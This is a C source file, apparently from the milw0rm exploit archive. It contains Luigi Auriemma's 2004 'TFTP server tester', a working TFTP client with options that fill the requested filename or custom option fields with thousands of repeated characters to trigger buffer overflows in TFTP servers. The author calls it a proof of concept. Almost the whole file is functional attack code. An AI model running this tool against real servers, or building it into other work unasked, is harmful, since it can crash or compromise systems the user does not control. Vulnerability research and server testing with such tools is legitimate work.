@@ -1,0 +1,611 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+/*
+
+Show_dump 0.1
+
+    Copyright 2004 Luigi Auriemma
+
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA
+
+    http://www.gnu.org/licenses/gpl.txt
+
+function to show the hex dump of a buffer
+
+Usage:
+
+    to show the hex dump on the screen:
+        show_dump(buffer, buffer_length, stdout);
+
+    to write the hex dump in a file or other streams:
+        show_dump(buffer, buffer_length, fd);
+
+    (if you know C you know what FILE *stream means 8-)
+*/
+
+
+
+void show_dump(unsigned char *buff, unsigned long buffsz, FILE *stream) {
+    const char      *hex = "0123456789abcdef";
+    unsigned char   buffout[68],
+                    *pout,
+                    *p1,
+                    *p2,
+                    i,
+                    rest;
+
+
+    p1 = buff;
+    p2 = buff;
+
+    while(buffsz) {
+
+        pout = buffout;
+        if(buffsz < 16) rest = buffsz;
+            else rest = 16;
+
+        for(i = 0; i < rest; i++, p1++) {
+            *pout++ = hex[*p1 >> 4];
+            *pout++ = hex[*p1 & 0xf];
+            *pout++ = 0x20;
+        }
+
+        for(i = pout - buffout; i < 50; i++, pout++) *pout = 0x20;
+
+        for(i = 0; i < rest; i++, p2++, pout++) {
+            if(*p2 >= 0x20) *pout = *p2;
+                else *pout = 0x2e;
+        }
+
+        *pout++ = 0x0a;
+        *pout   = 0x00;
+
+        fputs(buffout, stream);
+        buffsz -= rest;
+    }
+}
+
+
+
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+
+
+    #define close   closesocket
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+#endif
+
+
+
+#define VER     "0.1"
+#define BUFFSZ  65536
+#define UDPSZ   512
+#define PORT    69
+#define CHR     0x61
+#define TIMEOUT 3
+#define NONE    "none"
+
+
+
+u_long tftp_download(u_char *buff);
+u_long tftp_upload(u_char *buff, u_long filesz);
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+FILE    *fd;
+int     sd,
+        hexdump = 0;
+struct  sockaddr_in peer;
+
+
+
+int main(int argc, char *argv[]) {
+    u_long      tsize     = 0;
+    int         i,
+                len,
+                psz,
+                upload    = 0,
+                blocksize = 0,
+                tout      = 0,
+                multicast = 0,
+                overwrite = 0,
+                bofsize   = 0;
+    u_short     port = PORT;
+    u_char      *buff,
+                *local,
+                *remote,
+                *custom_option = NULL,
+                *custom_value  = NULL;
+    struct  stat    xstat;
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "TFTP server tester "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@altervista.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s [options] <host> <remote_file> <local_file>\n"
+            "\n"
+            "-u        upload a file, default is download\n"
+            "-t SIZE   tftp tsize option, default is %lu or real size if upload\n"
+            "-b SIZE   tftp blocksize option, default is not set\n"
+            "-o NUM    tftp timeout option, default is not set\n"
+            "-m NUM    tftp multicast option, default is not set\n"
+            "-c X Y    add a custom value where X is the option and Y its value\n"
+            "-C X Y    like above but X and Y are the size of the 2 values filled with '%c'\n"
+            "-p PORT   server port, default is %hu\n"
+            "-x        show the hexdump of any packet received\n"
+            "-y        automatically overwrite the local file if exists (only download)\n"
+            "-f [CHR]  this option is useful to easily test possible buffer-overflows in the\n"
+            "          filename sent to the server without manually specifying it. The\n"
+            "          default char is '%c' (0x%02x) and the number of chars to compose the\n"
+            "          filename must be specified in the remote_file argument.\n"
+            "          Example: -f server 8192 local.txt\n"
+            "\n"
+            "Note: if local_file is equal to %s will be used stdout for upload or stdin\n"
+            "      for download. Very useful to test overflow bugs without creating files.\n"
+            "\n", argv[0], tsize, CHR, port, CHR, CHR, NONE);
+        exit(1);
+    }
+
+    argc -= 3;
+    for(i = 1; i < argc; i++) {
+        switch(argv[i][1]) {
+            case '-':
+            case '?':
+            case 'h': {
+                fputs("\nError: use no arguments for the help\n", stdout);
+                exit(1);
+                } break;
+            case 'u': upload = 1; break;
+            case 't': tsize = atol(argv[++i]); break;
+            case 'b': blocksize = atoi(argv[++i]); break;
+            case 'o': tout = atoi(argv[++i]); break;
+            case 'm': multicast = atoi(argv[++i]); break;
+            case 'c': {
+                custom_option = argv[++i];
+                custom_value = argv[++i];
+                } break;
+            case 'C': {
+                len = atoi(argv[++i]);
+                custom_option = malloc(len + 1);
+                if(!custom_option) std_err();
+                memset(custom_option, CHR, len);
+                custom_option[len] = 0x00;
+
+                len = atoi(argv[++i]);
+                custom_value = malloc(len + 1);
+                if(!custom_value) std_err();
+                memset(custom_value, CHR, len);
+                custom_value[len] = 0x00;
+                } break;
+            case 'p': port = atoi(argv[++i]); break;
+            case 'x': hexdump = 1; break;
+            case 'y': overwrite = 1; break;
+            case 'f': bofsize = 1; break;
+            default: {
+                printf("\nError: Wrong command-line argument (%s)\n\n", argv[i]);
+                exit(1);
+            } break;
+        }
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    peer.sin_addr.s_addr = resolv(argv[argc]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+    psz                  = sizeof(peer);
+
+    printf("- target             %s:%hu\n",
+        inet_ntoa(peer.sin_addr),
+        port);
+
+    if(bofsize) {
+        bofsize = atoi(argv[argc + 1]);
+            // simple size check, not to avoid bof problems (this is
+            // only a PoC) but to limit bofsize to a correct value
+        if(bofsize > (BUFFSZ - 8)) bofsize = BUFFSZ - 8;
+        printf("- size of filename:  %d\n", bofsize);
+        remote = malloc(bofsize + 1);
+        if(!remote) std_err();
+        memset(remote, CHR, bofsize);
+        remote[bofsize] = 0x00;
+    } else {
+        remote = argv[argc + 1];
+    }
+    local = argv[argc + 2];
+    printf("- remote file:       %s\n", remote);
+    if(!strcmp(local, NONE)) {
+        if(!upload) {
+            fputs("- local file:        standard output\n", stdout);
+            fd = stdout;
+        } else {
+            fputs("- local file:        standard input\n", stdout);
+            fd = stdin;
+        }
+    } else {
+        printf("- local file:        %s\n", local);
+        if(!upload) {
+            fputs("- open local file for writing\n", stdout);
+            if(!overwrite) {
+                fd = fopen(local, "rb");
+                if(fd) {
+                    fputs("- file exists, do you wanna overwrite it?\n  (y/N) ", stdout);
+                    fflush(stdin);
+                    i = fgetc(stdin);
+                    if((i != 'y') && (i != 'Y')) {
+                        fputs("- exit\n\n", stdout);
+                        exit(1);
+                    }
+                    fclose(fd);
+                }
+            }
+            fd = fopen(local, "wb");
+            if(!fd) std_err();
+        } else {
+            fputs("- open local file for reading\n", stdout);
+            fd = fopen(local, "rb");
+            if(!fd) std_err();
+        }
+    }
+
+    buff = malloc(BUFFSZ);
+    if(!buff) std_err();
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    if(!upload) {
+        *(u_short *)buff = htons(1);
+    } else {
+        *(u_short *)buff = htons(2);
+        if(!tsize) {
+            fstat(fileno(fd), &xstat);
+            tsize = xstat.st_size;
+            printf("- local file size:   %lu\n", tsize);
+        }
+    }
+
+    len = strlen(remote) + 1;
+    memcpy(buff + 2, remote, len);
+    len += 2;
+    memcpy(buff + len, "octet", 6);
+    len += 6;
+
+    memcpy(buff + len, "tsize", 6);
+    len += 6;
+    len += sprintf(buff + len, "%lu", tsize) + 1;
+
+    if(blocksize) {
+        memcpy(buff + len, "blocksize", 10);
+        len += 10;
+        len += sprintf(buff + len, "%d", blocksize) + 1;
+    }
+
+    if(tout) {
+        memcpy(buff + len, "timeout", 8);
+        len += 8;
+        len += sprintf(buff + len, "%d", tout) + 1;
+    }
+
+    if(multicast) {
+        memcpy(buff + len, "multicast", 10);
+        len += 10;
+        len += sprintf(buff + len, "%d", multicast) + 1;
+    }
+
+    if(custom_option) {
+        i = strlen(custom_option) + 1;
+        memcpy(buff + len, custom_option, i);
+        len += i;
+        i = strlen(custom_value) + 1;
+        memcpy(buff + len, custom_value, i);
+        len += i;
+    }
+
+    fputs("- send file request\n", stdout);
+    if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(peer))
+      < 0) std_err();
+
+    if(!upload) {
+        fputs("- start download\n", stdout);
+        printf("\n- %lu bytes received\n", tftp_download(buff));
+    } else {
+        fputs("- start upload\n", stdout);
+        printf("\n- %lu bytes sent\n", tftp_upload(buff, tsize));
+    }
+
+    fclose(fd);
+    close(sd);
+    return(0);
+}
+
+
+
+u_long tftp_download(u_char *buff) {
+    u_long  tot,
+            filesz;
+    int     len,
+            psz;
+    u_short *opcode,
+            *block;
+
+    opcode = (u_short *)buff;
+    block  = (u_short *)(buff + 2);
+    psz    = sizeof(peer);
+
+    for(filesz = -1L, tot = 0; tot < filesz;) {
+        if(timeout(sd) < 0) {
+            fputs("\n- timeout or download finished\n", stdout);
+            break;
+        }
+        len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
+        if(len < 0) std_err();
+        if(!len) break;
+        if(hexdump) show_dump(buff, len, stdout);
+
+        switch(ntohs(*opcode)) {
+            case 3: {       /* DATA */
+                len -= 4;
+                if(fwrite(buff + 4, len, 1, fd) != 1) {
+                    fputs("\nError: impossible to write into the local file\n", stdout);
+                    exit(1);
+                }
+                fflush(fd);
+                tot += len;
+                } break;
+            case 5: {       /* ERROR */
+                printf("\n"
+                    "Error: TFTP error %d from the server:\n"
+                    "\n"
+                    "  %s\n"
+                    "\n", ntohs(*block), buff + 4);
+                exit(1);
+                } break;
+            case 6: {       /* OACK */
+                if(!strcmp(buff + 2, "tsize")) {
+                    sscanf(buff + 8, "%lu", &filesz);
+                    printf("- remote file size:  %lu\n", filesz);
+                }
+                *block = 0;
+                } break;
+            default: {
+                fputs("\nError: unknown tftp opcode\n\n", stdout);
+                if(!hexdump) show_dump(buff, len, stdout);
+                exit(1);
+                } break;
+        }
+
+        *opcode = htons(4);
+        if(sendto(sd, buff, 4, 0, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+
+        fputc('.', stdout);
+    }
+    return(tot);
+}
+
+
+
+u_long tftp_upload(u_char *buff, u_long filesz) {
+    u_long  tot;
+    int     len,
+            psz;
+    u_short *opcode,
+            *block,
+            num;
+
+    opcode = (u_short *)buff;
+    block  = (u_short *)(buff + 2);
+    psz    = sizeof(peer);
+
+    for(tot = 0, num = 0; tot < filesz; tot += len) {
+        if(timeout(sd) < 0) {
+            fputs("\n- timeout or upload finished\n", stdout);
+            break;
+        }
+        len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
+        if(len < 0) std_err();
+        if(!len) break;
+        if(hexdump) show_dump(buff, len, stdout);
+
+        switch(ntohs(*opcode)) {
+            case 4: {       /* ACK */
+                if(ntohs(*block) != num) {
+                    fputs("\nError: packet lost, retransmission is not supported yet\n", stdout);
+                    exit(1);
+                }
+                } break;
+            case 5: {       /* ERROR */
+                printf("\n"
+                    "Error: TFTP error %d from the server:\n"
+                    "\n"
+                    "  %s\n"
+                    "\n", ntohs(*block), buff + 4);
+                exit(1);
+                } break;
+            case 6: {       /* OACK */
+                } break;
+            default: {
+                fputs("\nError: unknown tftp opcode\n\n", stdout);
+                if(!hexdump) show_dump(buff, len, stdout);
+                exit(1);
+                } break;
+        }
+
+        len = fread(buff + 4, 1, UDPSZ, fd);
+        if(!len) break;
+        *opcode = htons(3);
+        *block  = htons(++num);
+        if(sendto(sd, buff, len + 4, 0, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+
+        fputc('.', stdout);
+    }
+
+    if(tot == filesz) {     /* seems needed or the server doesn't close the file */
+        *opcode = htons(3);
+        *block  = htons(++num);
+        if(sendto(sd, buff, 4, 0, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+    }
+
+    return(tot);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct hostent *hp;
+    u_long host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2004-11-01]
